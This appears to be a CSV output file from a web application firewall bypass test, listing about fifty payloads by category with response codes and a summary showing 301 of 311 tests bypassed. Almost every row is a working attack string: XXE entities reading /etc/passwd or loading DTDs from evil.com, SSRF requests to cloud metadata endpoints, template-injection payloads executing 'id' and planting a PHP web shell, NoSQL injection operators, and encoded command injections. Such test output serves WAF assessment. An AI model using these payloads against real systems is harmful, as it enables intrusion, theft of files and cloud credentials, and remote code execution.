Category,Method,Status,Response Time (ms),Payload,Is Redirect,WAF Detected,WAF Type,Timestamp,URL
"XXE - Advanced Vectors","GET",200,126,"%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,128,"http://127.0.0.1.localtest.me/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,130,"http://evil.com@127.0.0.1/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,131,"http://127.0.0.1.evil.com/",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,131,"file:///etc/passwd",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",200,136,"%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%27http%3A%2F%2Fevil.com%2Fevil.dtd%27%3E%20%25xxe%3B%5D%3E",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,144,"http://169.254.169.254/latest/meta-data/",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",200,145,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo><![CDATA[&xxe;]]></foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",200,147,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""ftp://evil.com/evil"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,159,"file://%2fetc%2fpasswd",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,160,"%7B%7B7%2A7%7D%7D",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,163,"file://\u002fetc\u002fpasswd",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,165,"http://169.254.169.254/metadata/v1/",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",200,172,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://evil.com/evil"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",200,173,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""expect://id"">]><foo>&xxe;</foo>",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",200,175,"\u003C\u003Fxml version\u003D\u00221.0\u0022\u003F\u003E\u003C\u0021DOCTYPE foo \u005B\u003C\u0021ENTITY xxe SYSTEM \u0027file\u003A\u002F\u002F\u002Fetc\u002Fpasswd\u0027\u003E\u005D\u003E\u003Cfoo\u003E\u0026xxe\u003B\u003C\u002Ffoo\u003E",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,176,"http://sudo.cc/127.0.0.1",false,false,"Unknown","",""
"SSRF - Protocol Smuggling","GET",200,177,"http://metadata.google.internal/",false,false,"Unknown","",""
"XXE - Advanced Vectors","GET",200,181,"%3C%21DOCTYPE%20data%20%5B%3C%21ENTITY%20%25%20file%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%20%25file%3B%5D%3E",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,127,"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,129,"%7B%7B%5F%73%65%6C%66%7D%7D",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,131,"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,136,"{{cycler.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,147,"{php}echo `id`;{/php}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",200,149,"\u007B\u0022\u0024ne\u0022\u003Anull\u007D",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,155,"\u007B\u007B7\u002A7\u007D\u007D",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,157,"$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id"")",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,158,"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join("" "")}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,159,"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""id"") }",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",200,164,"{""$regex"": "".*""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",200,165,"%7B%22%24%6E%65%22%3A%6E%75%6C%6C%7D",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",200,168,"{""$where"": ""obj.credits > obj.debits""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",200,169,"{""$where"": ""this.password.match(/.*/)""}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,171,"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,""<?php passthru($_GET[cmd]); ?>"",false)}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",200,176,"{""$where"": ""function(){return this.username == 'admin' || '1'=='1'}""}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,181,"#set($str=$class.inspect(""java.lang.String"").type)",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",200,184,"{""$expr"": {""$gt"": [{""$strLenCP"": ""$password""}, 0]}}",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",200,186,"{{joiner.__init__.__globals__.os.popen('id').read()}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",200,189,"{""selector"":{""_id"":{""$gt"":null}}}",false,false,"Unknown","",""
"Command Injection - Encoded","GET",200,116,"%7Ccat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","GET",200,120,"${PATH:0:1}bin${PATH:0:1}cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd",false,false,"Unknown","",""
"Command Injection - Encoded","GET",200,120,"\u007Cid",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",200,123,"{""selector"":{""$and"":[{""_id"":{""$gt"":null}}]}}",false,false,"Unknown","",""
"Command Injection - Encoded","GET",200,125,"%3Bcat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","GET",200,126,"%26%26cat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","GET",200,142,"\u003Bcat\u0020\u002Fetc\u002Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","GET",200,144,"$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",false,false,"Unknown","",""
"Command Injection - Encoded","GET",200,149,"`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`",false,false,"Unknown","",""
"Command Injection - Encoded","GET",200,154,"`printf ""\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""`",false,false,"Unknown","",""
"Command Injection - Encoded","GET",200,156,"${HOME:0:1}..${HOME:0:1}..${HOME:0:1}etc${HOME:0:1}passwd",false,false,"Unknown","",""

"--- Results Summary ---"
"Risk Level","Critical "
"WAF Effectiveness (%)",3.22
"Total Tests",311
"Bypassed",301

"--- Response Time Summary ---"
"Avg Response Time (ms)",172
"Min Response Time (ms)",0
"Max Response Time (ms)",286
"Slow Requests (>2000ms)",0
